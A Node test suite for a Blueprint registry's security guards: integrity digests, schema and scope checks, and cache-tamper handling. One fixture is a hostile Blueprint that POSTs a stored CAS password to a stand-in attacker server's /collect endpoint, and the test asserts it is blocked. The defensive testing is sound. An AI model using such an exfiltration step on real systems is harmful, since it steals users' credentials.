/**
 * Ce qui n'entre pas.
 *
 * Un Blueprint est de la **donnee executable**, et un registre distant sans gardes serait une porte
 * ouverte sur l'appareil de quelqu'un. Trois gardes, dans l'ordre d'importance du jalon :
 * l'**integrite** (ce que j'ai telecharge est bien ce que le manifeste annonce), le **perimetre**
 * (un Blueprint distant ne peut pas reclamer n'importe quel secret), et la **surete d'execution**
 * (acquise depuis le jalon 3-B : l'evaluateur n'execute pas de code dynamique — c'est la garde
 * `no-dynamic-code` qui la tient, ici on s'appuie dessus).
 *
 * La regle commune a tout le fichier : **un refus ne remplace jamais la version en place**. Une
 * garde qui mordrait en detruisant ce qui marchait serait une panne de plus, pas une protection.
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import { Aetherius } from "../dist/aetherius.js";
import { staticSecrets } from "../dist/secrets/index.js";
import { BlueprintRegistry } from "../dist/delivery/registry.js";
import { CACHE_KEY, memoryCache } from "../dist/delivery/cache.js";
import { MANIFEST_URL, cdn, digest, document, manifest, text } from "./delivery-support.mjs";
import { htmlServer } from "./support.mjs";

const NAME = "demo.delivery";
const FIX_URL = "https://cdn.example.test/aetherius/demo.v2.json";
const fix = text(document(NAME, { marker: "remote-v2" }));

function registry(routes, extra = {}) {
  const store = extra.cache ?? memoryCache();
  const network = cdn(routes);
  const subject = new BlueprintRegistry({
    bundled: { [NAME]: { version: "1", document: document(NAME, { marker: "bundled-v1" }) } },
    manifest: MANIFEST_URL,
    cache: store,
    fetch: network.fetch,
    ...extra,
  });
  return { subject, network, store };
}

const marker = async (subject) => (await subject.resolve(NAME)).blueprint.steps[0].value;

/** Amene le registre a l'etat « une v2 distante est en place », le point de depart des sondes. */
async function delivered(extra = {}) {
  const built = registry(
    {
      [MANIFEST_URL]: manifest({ [NAME]: { version: "2", url: FIX_URL, body: fix } }),
      [FIX_URL]: fix,
    },
    extra,
  );
  await built.subject.refresh();
  assert.equal(await marker(built.subject), "remote-v2");
  return built;
}

test("a digest that does not match is rejected, and the version in place survives", async () => {
  const { subject, network } = await delivered();
  const three = text(document(NAME, { marker: "remote-v3" }));
  const url = "https://cdn.example.test/aetherius/demo.v3.json";

  network.put(url, three);
  network.put(
    MANIFEST_URL,
    manifest({ [NAME]: { version: "3", url, body: three, sha256: digest("something else") } }),
  );

  const report = await subject.refresh();
  assert.equal(report.entries[0].outcome, "rejected");
  assert.match(report.entries[0].reason, /integrity check failed/);
  assert.equal(await marker(subject), "remote-v2");
});

test("a truncated download is rejected: the digest is what makes it visible", async () => {
  const { subject, network } = await delivered();
  const three = text(document(NAME, { marker: "remote-v3" }));
  const url = "https://cdn.example.test/aetherius/demo.v3.json";

  // Le manifeste annonce l'empreinte du fichier entier ; le CDN en sert la moitie.
  network.put(url, three.slice(0, Math.floor(three.length / 2)));
  network.put(MANIFEST_URL, manifest({ [NAME]: { version: "3", url, body: three } }));

  const report = await subject.refresh();
  assert.equal(report.entries[0].outcome, "rejected");
  assert.match(report.entries[0].reason, /integrity check failed/);
  assert.equal(await marker(subject), "remote-v2");
});

test("a malformed manifest replaces nothing", async () => {
  const { subject, network } = await delivered();

  for (const bad of [
    "{ not json",
    JSON.stringify({ manifest: "1", blueprints: { [NAME]: { version: "2" } } }),
    JSON.stringify({ manifest: "1", surprise: true, blueprints: {} }),
    JSON.stringify({ manifest: "2", blueprints: {} }),
  ]) {
    network.put(MANIFEST_URL, bad);
    const report = await subject.refresh();
    assert.equal(report.ok, false, `accepted: ${bad}`);
    assert.deepEqual(report.entries, []);
    assert.equal(await marker(subject), "remote-v2");
  }
});

test("a remote Blueprint that violates the schema is refused before it can be cached", async () => {
  const { subject, network } = await delivered();
  const broken = JSON.stringify({ aetherius: "1.0", name: NAME, act: "vector", steps: [] });
  const url = "https://cdn.example.test/aetherius/demo.broken.json";

  network.put(url, broken);
  network.put(MANIFEST_URL, manifest({ [NAME]: { version: "3", url, body: broken } }));

  const report = await subject.refresh();
  assert.equal(report.entries[0].outcome, "rejected");
  assert.match(report.entries[0].reason, /steps' or 'goal/);
  assert.equal(await marker(subject), "remote-v2");
});

test("a remote Blueprint this engine cannot run is refused, and the message says which", async () => {
  const { subject, network } = await delivered();
  const notPortable = text(
    document(NAME, {
      act: "continuum",
      steps: [{ id: "shot", action: "screenshot", path: "out.png" }],
    }),
  );
  const url = "https://cdn.example.test/aetherius/demo.notportable.json";

  network.put(url, notPortable);
  network.put(MANIFEST_URL, manifest({ [NAME]: { version: "3", url, body: notPortable } }));

  const report = await subject.refresh();
  assert.equal(report.entries[0].outcome, "rejected");
  assert.match(report.entries[0].reason, /screenshot/);
  assert.match(report.entries[0].reason, /embedded engine/);
  assert.equal(await marker(subject), "remote-v2");
});

test("a file delivered under a name that is not its own is refused", async () => {
  // Sinon le manifeste dirait une chose et l'appareil en jouerait une autre : une substitution
  // silencieuse d'un Blueprint par un autre.
  const { subject, network } = await delivered();
  const impostor = text(document("someone.else", { marker: "impostor" }));
  const url = "https://cdn.example.test/aetherius/demo.impostor.json";

  network.put(url, impostor);
  network.put(MANIFEST_URL, manifest({ [NAME]: { version: "3", url, body: impostor } }));

  const report = await subject.refresh();
  assert.equal(report.entries[0].outcome, "rejected");
  assert.match(report.entries[0].reason, /named 'someone\.else'/);
  assert.equal(await marker(subject), "remote-v2");
});

test("a cached entry tampered with after the fact is dropped when it is read", async () => {
  // L'integrite est verifiee **a chaque lecture**, pas seulement a l'ecriture : un cache local n'est
  // pas plus digne de confiance qu'un CDN, c'est un fichier sur un appareil.
  const store = memoryCache();
  const { subject } = await delivered({ cache: store });

  const saved = JSON.parse(await store.getItem(CACHE_KEY));
  saved.entries[NAME].text = text(document(NAME, { marker: "tampered" }));
  await store.setItem(CACHE_KEY, JSON.stringify(saved));

  const fresh = new BlueprintRegistry({
    bundled: { [NAME]: { version: "1", document: document(NAME, { marker: "bundled-v1" }) } },
    cache: store,
  });
  assert.equal(await marker(fresh), "bundled-v1");
  // Et l'entree est purgee, plutot que rejetee a chaque run pour l'eternite.
  assert.equal(await store.getItem(CACHE_KEY), null);
});

test("a corrupted cache document costs the overlay, not the application", async () => {
  const store = memoryCache();
  await store.setItem(CACHE_KEY, "}{ not a cache");

  const subject = new BlueprintRegistry({
    bundled: { [NAME]: { version: "1", document: document(NAME, { marker: "bundled-v1" }) } },
    cache: store,
  });
  assert.equal(await marker(subject), "bundled-v1");
});

test("a store that throws is treated as an absent store", async () => {
  const broken = {
    getItem: () => Promise.reject(new Error("SQLite is unhappy")),
    setItem: () => Promise.reject(new Error("SQLite is unhappy")),
    removeItem: () => Promise.reject(new Error("SQLite is unhappy")),
  };
  const { subject } = registry(
    {
      [MANIFEST_URL]: manifest({ [NAME]: { version: "2", url: FIX_URL, body: fix } }),
      [FIX_URL]: fix,
    },
    { cache: broken },
  );

  const report = await subject.refresh();
  assert.equal(report.entries[0].outcome, "updated");
  // La correction vaut pour ce processus ; elle ne survivra pas, et rien n'a explose.
  assert.equal(await marker(subject), "remote-v2");
});

test("a secret the application does not allow is out of scope, whatever the file says", async () => {
  const { subject, network } = await delivered();
  const greedy = text(document(NAME, { secrets: ["cas_pass"], marker: "greedy" }));
  const url = "https://cdn.example.test/aetherius/demo.greedy.json";

  network.put(url, greedy);
  network.put(MANIFEST_URL, manifest({ [NAME]: { version: "3", url, body: greedy } }));

  const report = await subject.refresh();
  assert.equal(report.entries[0].outcome, "rejected");
  assert.match(report.entries[0].reason, /does not allow: cas_pass/);
  assert.equal(await marker(subject), "remote-v2");
});

test("the default scope is what the bundle declares, and it does let a legitimate fix through", async () => {
  const bundled = document(NAME, { secrets: ["demo_token"], marker: "bundled-v1" });
  const fixed = text(document(NAME, { secrets: ["demo_token"], marker: "remote-v2" }));
  const network = cdn({
    [MANIFEST_URL]: manifest({ [NAME]: { version: "2", url: FIX_URL, body: fixed } }),
    [FIX_URL]: fixed,
  });
  const subject = new BlueprintRegistry({
    bundled: { [NAME]: { version: "1", document: bundled } },
    manifest: MANIFEST_URL,
    cache: memoryCache(),
    fetch: network.fetch,
  });

  const report = await subject.refresh();
  assert.equal(report.entries[0].outcome, "updated");
  assert.equal(await marker(subject), "remote-v2");
});

test("an exfiltration attempt fails end to end, through the real facade", async () => {
  // La sonde du jalon : un manifeste hostile publie un Blueprint qui reclame le mot de passe CAS et
  // le poste chez lui. Ce qu'on verifie n'est pas un message d'erreur — c'est qu'**aucun octet
  // n'arrive** sur le serveur de l'attaquant, et que c'est bien l'embarque qui a tourne.
  const received = [];
  const attacker = await htmlServer({
    "/collect": ({ body }) => {
      received.push(body);
      return { body: "ok" };
    },
  });

  try {
    const hostile = text(
      document(NAME, {
        secrets: ["cas_pass"],
        steps: [
          {
            id: "leak",
            action: "http.request",
            method: "POST",
            url: `${attacker.baseUrl}/collect`,
            form: { stolen: "{{ secrets.cas_pass }}" },
          },
        ],
      }),
    );
    const url = "https://cdn.example.test/aetherius/hostile.json";
    const { subject } = registry({
      [MANIFEST_URL]: manifest({ [NAME]: { version: "9", url, body: hostile } }),
      [url]: hostile,
    });

    const report = await subject.refresh();
    assert.equal(report.entries[0].outcome, "rejected");

    const resolved = await subject.resolve(NAME);
    assert.equal(resolved.origin, "bundled");

    const client = new Aetherius({ secrets: staticSecrets({ cas_pass: "hunter2" }) });
    const result = await client.run(resolved.blueprint);
    assert.equal(result.status, "success");
    assert.deepEqual(result.outputs, { marker: "bundled-v1" });
    assert.deepEqual(received, []);
  } finally {
    await attacker.close();
  }
});

test("a bundled key that lies about its Blueprint name is refused at construction", async () => {
  // Une cle qui ment rendrait toute mise a jour distante silencieusement sans effet : le manifeste
  // designerait un nom que personne ne resout.
  assert.throws(
    () =>
      new BlueprintRegistry({
        bundled: { "wrong.key": { version: "1", document: document(NAME) } },
      }),
    { name: "BlueprintValidationError" },
  );
});
